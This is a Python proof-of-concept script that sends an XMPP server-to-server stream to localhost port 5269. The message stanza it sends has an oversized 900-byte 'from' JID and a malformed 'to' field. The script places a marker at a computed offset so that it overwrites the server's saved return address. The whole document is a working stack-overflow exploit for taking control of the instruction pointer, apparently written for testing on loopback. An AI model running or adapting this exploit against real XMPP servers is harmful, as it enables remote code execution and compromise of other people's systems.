#!/usr/bin/env python3
"""Loopback-only: 900-byte chosen JID + malformed `to` to force early return."""
import socket, sys, time
FROM_LEN = int(sys.argv[1]) if len(sys.argv) > 1 else 900
TO_LEN = int(sys.argv[2]) if len(sys.argv) > 2 else 260
MARKER = sys.argv[3].encode() if len(sys.argv) > 3 else b'RIPCNTRL'
RIP_OFF = 884  # stock saved RIP at buf_from+888; JID byte j is at buf_from[4+j]
f = bytearray(ord('A') + i % 26 for i in range(FROM_LEN))
f[RIP_OFF:RIP_OFF+len(MARKER)] = MARKER
STREAM = ("<?xml version='1.0'?>"
          "<stream:stream xmlns:stream='http://etherx.jabber.org/streams' "
          "xmlns='jabber:server' version='1.0' to='127.0.0.1'>")
STANZA = ('<message from="%s" to="%s" type="chat"><body>hi</body></message>'
          % (f.decode(), 'T' * TO_LEN))
print("EARLY from_len=%d to_len=%d marker=%r at_jid=%d bytes=%r" %
      (FROM_LEN, TO_LEN, MARKER, RIP_OFF, bytes(f[RIP_OFF:RIP_OFF+8])))
s = socket.create_connection(("127.0.0.1", 5269), timeout=3)
s.settimeout(1.0)
s.sendall(STREAM.encode()); time.sleep(0.3)
try: print("EARLY reply1=%r" % s.recv(8192))
except socket.timeout: print("EARLY reply1=<timeout>")
s.sendall(STANZA.encode()); time.sleep(1.0)
try: print("EARLY reply2=%r" % s.recv(8192))
except socket.timeout: print("EARLY reply2=<timeout>")
s.close(); print("EARLY client_done")
